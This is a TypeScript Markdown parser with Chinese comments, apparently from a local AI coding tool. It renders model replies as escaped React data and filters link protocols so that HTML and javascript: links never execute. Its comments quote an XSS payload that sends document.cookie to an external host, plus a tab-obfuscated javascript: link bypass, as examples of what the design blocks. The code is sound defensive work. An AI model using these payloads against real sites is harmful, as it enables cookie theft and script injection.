// 把模型输出的 Markdown 解析成一棵**数据**树。
//
// # 为什么自己写，而不是用 marked + DOMPurify
//
// 现成的做法是把 Markdown 转成 HTML 字符串，再用 dangerouslySetInnerHTML 塞进 DOM。
// 那条路要求**把模型输出当成 HTML 来执行**，然后靠一个净化库把危险的东西滤掉。
//
// 模型的回复里可以出现任何东西，包括它刚 cat 出来的文件内容。仓库里只要有一行
//
//     <img src=x onerror="fetch('http://外部/?c='+document.cookie)">
//
// 模型把它引进回复，就全指望 DOMPurify 拦得住。它多半拦得住——但那是一道**需要一直
// 正确**的防线，而它保护的是一个能在本机执行任意命令的工具的界面。
//
// 解析成数据、再由 React 渲染成元素树，则根本没有这道防线可言：React 的文本节点天生
// 转义，`{text}` 永远是文字，不可能变成标签。攻击面不是被过滤掉，是**不存在**。
//
// 代价是只支持一个子集。这是可接受的：对话里的 Markdown 就那么几种，而且解析器是
// 纯函数，可以直接用 bun test 锁住（见 markdown.test.ts）。
//
// # 这里只负责解析
//
// 输出是纯数据，不含任何 React 的东西——渲染在 Markdown.tsx。分开是为了能不搭 DOM
// 就测它：解析是"同样输入必须得到同样输出"的事，不该为了验证它去起一个浏览器。

/** Span 是行内元素。 */
export type Span =
  | { kind: "text"; text: string }
  | { kind: "code"; text: string }
  | { kind: "strong"; spans: Span[] }
  | { kind: "em"; spans: Span[] }
  | { kind: "strike"; spans: Span[] }
  | { kind: "link"; href: string; spans: Span[] };

/** 表格单元格的对齐方式。 */
export type Align = "left" | "center" | "right";

/** Block 是块级元素。 */
export type Block =
  | { kind: "heading"; level: number; spans: Span[] }
  | { kind: "paragraph"; spans: Span[] }
  | { kind: "code"; language: string; code: string; closed: boolean }
  | { kind: "list"; ordered: boolean; start: number; items: ListItem[] }
  | { kind: "quote"; blocks: Block[] }
  | { kind: "rule" }
  | { kind: "table"; align: Align[]; header: Span[][]; rows: Span[][][] };

/**
 * ListItem 是列表里的一项。
 *
 * depth 是缩进层级。**AST 是平的**：嵌套列表不生成嵌套结构，只记下层级由渲染层
 * 缩进。语义上不完美（屏幕阅读器看到的是同一层），但省掉了递归解析的一大堆边角，
 * 而对话里的嵌套列表几乎只用来做视觉分组。
 */
export interface ListItem {
  spans: Span[];
  depth: number;
}

/** 允许出现在链接里的协议。其余一律降级成纯文字。 */
const allowedProtocols = ["http:", "https:", "mailto:", "file:"];

/**
 * safeHref 检查链接协议，不安全就返回 null；安全则返回**规范化之后**的链接。
 *
 * 主要挡的是 `javascript:`——那是唯一一个点一下就能执行代码的协议。相对链接
 * （不含协议）放行：它们最多跳到本站的一个不存在的页面。
 *
 * # 为什么要先删掉控制字符
 *
 * HTML 标准要求浏览器在解析 href **之前**先剥掉其中的制表符、换行和回车。因此
 *
 *     [点我](java&#9;script:alert(1))
 *
 * 在浏览器眼里就是 `javascript:alert(1)`，而按原样做前缀匹配会认为它"没有协议"、
 * 当成相对链接放行。这是一个有年头的绕过手法，本项目的测试里就栽过一次。
 *
 * 所以：**按浏览器最终看到的样子来判断**，并且**返回同一个字符串**——校验一个值、
 * 渲染另一个值，等于没校验。
 */
export function safeHref(raw: string): string | null {
  // C0 控制字符和 DEL 全部剥掉，覆盖 \t \n \r \0 以及别的花样。
  const href = raw.replace(/[\u0000-\u001F\u007F]/g, "").trim();
  if (href === "") return null;
  if (!/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(href)) return href;
  try {
    const parsed = new URL(href);
    return allowedProtocols.includes(parsed.protocol) ? href : null;
  } catch {
    return null;
  }
}

/** parseMarkdown 把一段文本解析成块级元素序列。 */
export function parseMarkdown(text: string): Block[] {
  const lines = text.replace(/\r\n?/g, "\n").split("\n");
  return parseBlocks(lines);
}

/** parseBlocks 是块级解析的主循环。 */
function parseBlocks(lines: string[]): Block[] {
  const blocks: Block[] = [];
  let index = 0;

  while (index < lines.length) {
    const line = lines[index];

    // 空行只是分隔，不产生块。
    if (line.trim() === "") {
      index++;
      continue;
    }

    // 围栏代码块。**必须最先判断**：里面的一切都不该被当成 Markdown，
    // 否则一段 shell 脚本里的 # 会变成标题。
    const fence = /^\s*(```+|~~~+)\s*(\S*)\s*$/.exec(line);
    if (fence) {
      const marker = fence[1][0];
      const body: string[] = [];
      index++;
      let closed = false;
      while (index < lines.length) {
        if (new RegExp(`^\\s*${marker}{3,}\\s*$`).test(lines[index])) {
          closed = true;
          index++;
          break;
        }
        body.push(lines[index]);
        index++;
      }
      // closed=false 表示这是**流式输出到一半**的代码块。照样渲染成代码块，
      // 而不是退回普通段落——否则写完最后三个反引号的瞬间，整段会从段落跳变成
      // 代码块，读的人会看到画面抖一下。
      blocks.push({ kind: "code", language: fence[2], code: body.join("\n"), closed });
      continue;
    }

    // 水平线。要放在列表前面判断：`---` 和 `- ` 开头的列表项容易混。
    if (/^\s*([-*_])\s*(\1\s*){2,}$/.test(line)) {
      blocks.push({ kind: "rule" });
      index++;
      continue;
    }

    // 标题。
    const heading = /^(#{1,6})\s+(.*)$/.exec(line);
    if (heading) {
      blocks.push({
        kind: "heading",
        level: heading[1].length,
        spans: parseInline(heading[2].replace(/\s+#+\s*$/, "")),
      });
      index++;
      continue;
    }

    // 引用：连续的 > 行剥掉标记之后递归解析，因此引用里可以有列表和代码块。
    if (/^\s*>/.test(line)) {
      const quoted: string[] = [];
      while (index < lines.length && /^\s*>/.test(lines[index])) {
        quoted.push(lines[index].replace(/^\s*>\s?/, ""));
        index++;
      }
      blocks.push({ kind: "quote", blocks: parseBlocks(quoted) });
      continue;
    }

    // 表格：当前行像表头，下一行是分隔行。
    if (index + 1 < lines.length && isTableSeparator(lines[index + 1]) && line.includes("|")) {
      const align = parseAlign(lines[index + 1]);
      const header = splitRow(line).map(parseInline);
      index += 2;
      const rows: Span[][][] = [];
      while (index < lines.length && lines[index].includes("|") && lines[index].trim() !== "") {
        rows.push(splitRow(lines[index]).map(parseInline));
        index++;
      }
      blocks.push({ kind: "table", align, header, rows });
      continue;
    }

    // 列表：连续的列表行归成一个块。
    if (listMarkerOf(line)) {
      const items: ListItem[] = [];
      const first = listMarkerOf(line)!;
      const ordered = first.ordered;
      const start = first.start;
      while (index < lines.length) {
        const marker = listMarkerOf(lines[index]);
        if (!marker || marker.ordered !== ordered) break;
        items.push({ spans: parseInline(marker.text), depth: marker.depth });
        index++;
      }
      blocks.push({ kind: "list", ordered, start, items });
      continue;
    }

    // 其余是段落：连续的非空行合成一段，行内的换行保留（对话里换行通常是有意的）。
    const paragraph: string[] = [];
    while (index < lines.length && lines[index].trim() !== "") {
      const next = lines[index];
      // 遇到别的块级起手式就收尾，交给主循环处理。
      if (
        index > 0 &&
        (/^\s*(```+|~~~+)/.test(next) ||
          /^(#{1,6})\s+/.test(next) ||
          /^\s*>/.test(next) ||
          listMarkerOf(next) ||
          /^\s*([-*_])\s*(\1\s*){2,}$/.test(next))
      ) {
        if (paragraph.length > 0) break;
      }
      paragraph.push(next);
      index++;
    }
    if (paragraph.length > 0) {
      blocks.push({ kind: "paragraph", spans: parseInline(paragraph.join("\n")) });
    }
  }

  return blocks;
}

/** listMarkerOf 判断一行是不是列表项，是就拆出层级、序号和正文。 */
function listMarkerOf(
  line: string,
): { ordered: boolean; start: number; depth: number; text: string } | null {
  const unordered = /^(\s*)([-*+])\s+(.*)$/.exec(line);
  if (unordered) {
    return {
      ordered: false,
      start: 1,
      // 每两个空格算一层。制表符按四个空格折算。
      depth: Math.floor(unordered[1].replace(/\t/g, "    ").length / 2),
      text: unordered[3],
    };
  }
  const ordered = /^(\s*)(\d{1,9})[.)]\s+(.*)$/.exec(line);
  if (ordered) {
    return {
      ordered: true,
      start: Number(ordered[2]),
      depth: Math.floor(ordered[1].replace(/\t/g, "    ").length / 2),
      text: ordered[3],
    };
  }
  return null;
}

/** isTableSeparator 判断一行是不是表格的分隔行（`|---|:--:|`）。 */
function isTableSeparator(line: string): boolean {
  if (!line.includes("-")) return false;
  return /^\s*\|?\s*:?-{1,}:?\s*(\|\s*:?-{1,}:?\s*)*\|?\s*$/.test(line);
}

/** parseAlign 从分隔行读出每一列的对齐方式。 */
function parseAlign(line: string): Align[] {
  return splitRow(line).map((cell) => {
    const trimmed = cell.trim();
    const left = trimmed.startsWith(":");
    const right = trimmed.endsWith(":");
    if (left && right) return "center";
    if (right) return "right";
    return "left";
  });
}

/** splitRow 按竖线切开一行表格，去掉首尾的空单元格。 */
function splitRow(line: string): string[] {
  const cells = line.trim().replace(/^\|/, "").replace(/\|$/, "").split("|");
  return cells.map((cell) => cell.trim());
}

/**
 * parseInline 解析行内语法。
 *
 * 单趟扫描，优先级由判断顺序决定：**代码 span 最高**——反引号里的东西一律原样，
 * 否则一段 `**ptr` 这样的 C 代码会被当成粗体的开头。
 */
export function parseInline(text: string): Span[] {
  const spans: Span[] = [];
  let buffer = "";
  let index = 0;

  /** flush 把攒下的纯文字收进结果。 */
  const flush = () => {
    if (buffer !== "") {
      spans.push({ kind: "text", text: buffer });
      buffer = "";
    }
  };

  while (index < text.length) {
    const rest = text.slice(index);

    // 反斜杠转义：下一个字符原样取用。
    if (text[index] === "\\" && index + 1 < text.length) {
      buffer += text[index + 1];
      index += 2;
      continue;
    }

    // 行内代码。用等长的反引号配对，因此 ``含有 ` 的代码`` 也能写。
    const codeOpen = /^(`+)/.exec(rest);
    if (codeOpen) {
      const ticks = codeOpen[1];
      const closeAt = rest.indexOf(ticks, ticks.length);
      if (closeAt > 0) {
        flush();
        spans.push({ kind: "code", text: rest.slice(ticks.length, closeAt) });
        index += closeAt + ticks.length;
        continue;
      }
    }

    // 强调。先长后短：** 要在 * 之前判断，否则 **x** 会被拆成两个空斜体。
    const emphasis = matchDelimited(rest, "**", "strong") ??
      matchDelimited(rest, "__", "strong") ??
      matchDelimited(rest, "~~", "strike") ??
      matchDelimited(rest, "*", "em") ??
      matchDelimited(rest, "_", "em");
    if (emphasis) {
      flush();
      spans.push(emphasis.span);
      index += emphasis.length;
      continue;
    }

    // 链接。
    const link = /^\[([^\]]*)\]\(([^)\s]*)(?:\s+"[^"]*")?\)/.exec(rest);
    if (link) {
      const href = safeHref(link[2]);
      flush();
      if (href) {
        spans.push({ kind: "link", href, spans: parseInline(link[1]) });
      } else {
        // 协议不安全：整段降级成纯文字，把原文照原样显示出来，
        // 而不是悄悄吞掉——用户该看到模型确实写了这么个东西。
        spans.push({ kind: "text", text: link[0] });
      }
      index += link[0].length;
      continue;
    }

    buffer += text[index];
    index++;
  }

  flush();
  return spans;
}

/** matchDelimited 尝试匹配一对相同的定界符。 */
function matchDelimited(
  rest: string,
  marker: string,
  kind: "strong" | "em" | "strike",
): { span: Span; length: number } | null {
  if (!rest.startsWith(marker)) return null;
  const closeAt = rest.indexOf(marker, marker.length);
  // 找不到闭合，或者中间是空的（`**` 挨着 `**`），都不算强调。
  if (closeAt <= marker.length) return null;
  const inner = rest.slice(marker.length, closeAt);
  // 定界符紧跟空白不算强调：`a * b * c` 里的星号是乘号。
  if (/^\s|\s$/.test(inner)) return null;
  return {
    span: { kind, spans: parseInline(inner) } as Span,
    length: closeAt + marker.length,
  };
}
